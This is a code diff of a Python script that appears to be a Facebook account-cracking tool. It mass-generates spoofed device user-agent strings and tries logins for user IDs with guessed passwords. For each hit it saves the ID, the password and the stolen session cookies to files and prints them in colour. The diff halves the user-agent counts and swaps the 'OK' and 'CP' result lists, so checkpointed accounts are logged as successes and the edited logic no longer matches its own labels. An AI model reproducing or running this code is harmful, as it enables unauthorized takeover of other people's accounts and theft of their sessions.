@@ -81,8 +81,8 @@ gt = random.choice([
     'GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'
 ])
 
-# Pattern 1: GT model (10,000)
-for xd in range(10000):
+# Pattern 1: GT model (5000)
+for xd in range(5000):
     aa = 'Mozilla/5.0 (Linux; U; Android'
     b = random.choice(['6','7','8','9','10','11','12','13'])
     c = f' TL-tl; {str(gt)}'
@@ -95,7 +95,7 @@ for xd in range(10000):
     uaku2 = f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uaku2)
 
-# Pattern 2: Windows user agents (10,000)
+# Pattern 2: Windows user agents (5000)
 def windows():
     aV = str(random.choice(range(10,20)))
     A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
@@ -110,11 +110,11 @@ def windows():
     D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
     return random.choice([A,B,C,D])
 
-for _ in range(10000):
+for _ in range(5000):
     ugen.append(windows())
 
-# Pattern 3: Samsung J-series (10,000)
-for ua in range(10000):
+# Pattern 3: Samsung J-series (5000)
+for ua in range(5000):
     a = 'Mozilla/5.0 (Linux; Android'
     b = random.choice(['5.1.1','6.0.1','7.1.1','12','13','14','15'])
     y = random.choice(['SM-J320H','SM-J3109','J320FN','SM-J320P','SM-J320F','SM-J320G','SM-J320Y'])
@@ -127,8 +127,8 @@ for ua in range(10000):
     aalhaj = f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}"
     ugen.append(aalhaj)
 
-# Pattern 4: Realme devices (10,000)
-for ua in range(10000):
+# Pattern 4: Realme devices (5000)
+for ua in range(5000):
     a = 'Mozilla/5.0 (Linux; Android'
     b = random.choice(['8','9','10','11','12','13','14','15'])
     y = random.choice(['RMX3571','RMX3511','RMX3461','RMX3741','RMP2107','RMX3572','RMX1921','RMX3121','RMX3350'])
@@ -141,8 +141,8 @@ for ua in range(10000):
     alhajc = f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}"
     ugen.append(alhajc)
 
-# Pattern 5: Tecno devices (10,000)
-for ua in range(10000):
+# Pattern 5: Tecno devices (5000)
+for ua in range(5000):
     a = 'Mozilla/5.0 (Linux; Android'
     b = random.choice(['5','6','7','8','9','10','11','12','13','14','15'])
     xs = 'TECNO'
@@ -156,17 +156,17 @@ for ua in range(10000):
     alhajj = f"{a} {b}; {xs} {nx} {c}{d}.{e}.{f}.{g} {h}"
     ugen.append(alhajj)
 
-# Pattern 6: Windows Chrome agents (10,000)
+# Pattern 6: Windows Chrome agents (5000)
 def ua():
     ver = str(random.choice(range(77, 500)))
     ver2 = str(random.choice(range(57, 77)))
     return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"
 
-for _ in range(10000):
+for _ in range(5000):
     ugen.append(ua())
 
-# Pattern 7: Samsung Galaxy devices (10,000)
-for xd in range(10000):  
+# Pattern 7: Samsung Galaxy devices (5000)
+for xd in range(5000):  
     a = 'Mozilla/5.0 (Linux; Android'
     b = random.choice(['8.1.0','9','10','11','12','13'])
     c = 'SM-G960N Build/QP1A.190711.020; wv)'
@@ -179,8 +179,8 @@ for xd in range(10000):
     uakuh = f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
     ugen.append(uakuh)
 
-# Pattern 8: Samsung J-series alternate (10,000)
-for xd in range(10000): 
+# Pattern 8: Samsung J-series alternate (5000)
+for xd in range(5000): 
     aa = 'Mozilla/5.0 (Linux; Android'
     b = random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
     c = random.choice(['SM-J610F'])
@@ -196,8 +196,8 @@ for xd in range(10000):
     uakuh = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uakuh)
 
-# Pattern 9: OnePlus devices (10,000)
-for xd in range(10000): 
+# Pattern 9: OnePlus devices (5000)
+for xd in range(5000): 
     aa = 'Mozilla/5.0 (Linux; U; Android'
     b = random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
     c = random.choice(['LE2113'])
@@ -213,8 +213,8 @@ for xd in range(10000):
     uakuh = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uakuh)
 
-# Pattern 10: Realme GT series (10,000)
-for xd in range(10000): 
+# Pattern 10: Realme GT series (5000)
+for xd in range(5000): 
     aa = 'Mozilla/5.0 (Linux; U; Android'
     b = random.choice(['6','7','8','9','10','11','12'])
     c = ['en-us; RMX1925 Build/QKQ1.200209.002)']
@@ -230,8 +230,8 @@ for xd in range(10000):
     uakuh = f'{aa} {b}; {c[0]}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
     ugen.append(uakuh)
 
-# Trim to exactly 100,000 if needed
-ugen = ugen[:100000]
+# Trim to exactly 50,000 if needed
+ugen = ugen[:50000]
 
 # Print sample user agents
 print(f"Generated {len(ugen)} user agents\n")
@@ -443,16 +443,15 @@ def login1(uid):
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:
                 cookies = ";".join([f"{i['name']}={i['value']}" for i in rp.get('session_cookies', [])])
-                oks.append(uid)
+                cps.append(uid)
                 open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
                 print(f'\r\033[38;5;46m[MAAZ-OK] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')
                 break
 
-            # ✅ CP case
             elif "www.facebook.com" in rp.get('error', {}).get('message', ''):
                 cookies = ";".join([f"{i.get('name')}={i.get('value')}" for i in rp.get('session_cookies', [])]) if "session_cookies" in rp else "NO-COOKIE"
-                cps.append(uid)
-                open("/sdcard/OLD_CLONING-CP.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
+                oks.append(uid)
+                open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
                 print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')
                 break
 
